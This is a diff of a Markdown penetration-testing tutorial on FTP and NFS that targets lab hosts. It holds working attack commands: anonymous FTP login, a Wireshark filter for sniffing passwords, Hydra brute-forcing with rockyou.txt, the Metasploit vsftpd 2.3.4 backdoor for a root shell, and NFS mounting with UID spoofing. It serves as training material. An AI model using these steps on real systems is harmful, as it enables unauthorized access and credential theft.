@@ -1,7 +1,7 @@
 ## **Network Protocols**
 
 ### Network protocols allow devices to communicate and exchange data over a network. Here’s an expanded explanation of some commonly used protocols in penetration testing:
-
+---
 ### **1. FTP (File Transfer Protocol)**
 
 - **Port:** 21 (TCP)
@@ -23,13 +23,14 @@ When performing penetration testing, an attacker can attempt to log in using **a
 **Example FTP login attempt:**
 
 ```bash
-bash
-CopyEdit
+
 ftp 192.168.188.131
 Name: Anonymous
 Password: Anonymous
 
 ```
+![image](https://github.com/user-attachments/assets/00f9a1e5-3e22-4ad2-86cc-10d990b43574)
+
 
 If the server allows anonymous login, you will be able to interact with the server and explore its contents.
 
@@ -46,8 +47,7 @@ Because FTP doesn’t encrypt traffic, usernames and passwords are sent in clear
 1. **Start an FTP session**:
     
     ```bash
-    bash
-    CopyEdit
+    
     ftp 192.168.188.131
     
     ```
@@ -56,15 +56,12 @@ Because FTP doesn’t encrypt traffic, usernames and passwords are sent in clear
 3. **Follow the TCP stream** to see the credentials:
     - Look for packets containing the string `"PASS"` in Wireshark, which indicates the password being sent.
 
-**Example of clear-text credentials:**
+**Filter clear-text credentials:**
 
 ```
-plaintext
-CopyEdit
-USER anonymous
-PASS anonymous
-
+frame contains "PASS"
 ```
+![image](https://github.com/user-attachments/assets/84ba48da-79ce-4da8-89d0-0158d5ee9db2)
 
 ---
 
@@ -75,10 +72,10 @@ PASS anonymous
 **Example of brute-forcing FTP login:**
 
 ```bash
-bash
-CopyEdit
+
 hydra -L user -P pass 192.168.188.131 ftp
 hydra -L wordlist.txt -P wordlist.txt 192.168.188.131 ftp
+use: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
 
 ```
 
@@ -87,6 +84,7 @@ hydra -L wordlist.txt -P wordlist.txt 192.168.188.131 ftp
 - **ftp** is the target protocol.
 
 The **wordlist** file contains a list of possible usernames or passwords to be tried. A strong wordlist (such as **rockyou.txt**) increases the chance of success.
+![image](https://github.com/user-attachments/assets/eafa1572-24ac-4ef1-93bd-6734b79ad5e0)
 
 ---
 
@@ -97,13 +95,13 @@ You can also use **Nmap** to exploit specific vulnerabilities in FTP servers. Th
 **Example Nmap command to check for the backdoor:**
 
 ```bash
-bash
-CopyEdit
+
 sudo nmap -p 21 192.168.188.131 -sV --script ftp-vsftpd-backdoor.nse
 
 ```
 
 This will test if the FTP server is vulnerable to the **vsFTPd backdoor**. If the server is vulnerable, you may be able to execute commands remotely.
+![image](https://github.com/user-attachments/assets/48113953-c487-4bfa-bf04-49b376c60901)
 
 ---
 
@@ -116,8 +114,7 @@ Metasploit is another powerful tool used for exploiting vulnerabilities in syste
 1. **Search for the exploit:**
     
     ```bash
-    bash
-    CopyEdit
+    
     msfconsole
     search vsftpd 2.3.4
     
@@ -126,8 +123,7 @@ Metasploit is another powerful tool used for exploiting vulnerabilities in syste
 2. **Use the exploit:**
     
     ```bash
-    bash
-    CopyEdit
+  
     use exploit/unix/ftp/vsftpd_234_backdoor
     set RHOST 192.168.188.131
     exploit
@@ -137,14 +133,14 @@ Metasploit is another powerful tool used for exploiting vulnerabilities in syste
 3. **Interact with the remote shell:**
     
     ```bash
-    bash
-    CopyEdit
+   
     python -c 'import pty; pty.spawn("/bin/bash")'
     
     ```
     
 
 By exploiting this vulnerability, you can get access to the **root** account on the target machine.
+![image](https://github.com/user-attachments/assets/2c266ec1-e757-4442-970e-cc713e589347)
 
 ---
 
@@ -155,8 +151,7 @@ NFS allows a system to share its files with other systems over a network. It ena
 **Example Nmap command to scan for NFS services:**
 
 ```bash
-bash
-CopyEdit
+
 nmap -p2049 -sV 192.168.188.131
 
 ```
@@ -166,26 +161,63 @@ If NFS is exposed publicly, it can be mounted to the local machine and files can
 **Mounting NFS share:**
 
 ```bash
-bash
-CopyEdit
+
 sudo mount 192.168.188.131:/ /home/kali/Downloads/nfs -nolock
 
 ```
 
 This allows you to access shared files from the remote NFS server.
+![image](https://github.com/user-attachments/assets/34ad4003-778a-4011-b5ee-1c63e17adf4a)
 
 **Troubleshooting NFS Mount Permission Issues:**
 
 If you encounter **Permission Denied**, ensure that you have the correct NFS version and permissions configured.
-
+https://blog.christophetd.fr/write-up-vulnix/
 **To use NFSv3 (if needed):**
 
 ```bash
-bash
-CopyEdit
+
 sudo mount -t nfs -o vers=3 192.168.188.137:/home/vulnix /home/kali/Downloads/nfs/home/vulnix -nolock
 
 ```
+Let’s take a closer look at the permissions. 
+```bash
+ls -ld vulnix
+```
+If only Particuler user or group have access to the Path:
+create a user group:
+```jsx
+sudo groupadd --gid 2008 vulnix_group
+sudo useradd --uid 2008 --groups vulnix_group vulnix
+sudo -u vulnix ls -l vulnix
+```
+
+![image](https://github.com/user-attachments/assets/c5978efc-c909-48b1-8165-5705d484ef0a)
+
+
+DEBUG
+
+```jsx
+id vulnix
+```
+
+Ensure it outputs:
+
+```jsx
+uid=2008(vulnix) gid=2008(vulnix_group) groups=2008(vulnix_group)
+```
+
+If the UID or GID is incorrect, you must delete and recreate the user with:
+
+```jsx
+sudo userdel vulnix
+sudo groupdel vulnix_group
+sudo groupadd --gid 2008 vulnix_group
+sudo useradd --uid 2008 --gid 2008 --groups vulnix_group vulnix
+```
+
+Now, try accessing the directory as `vulnix_user`:
+![image](https://github.com/user-attachments/assets/90546368-1291-4e7a-b7c9-52a148eef779)
 
 ---
 
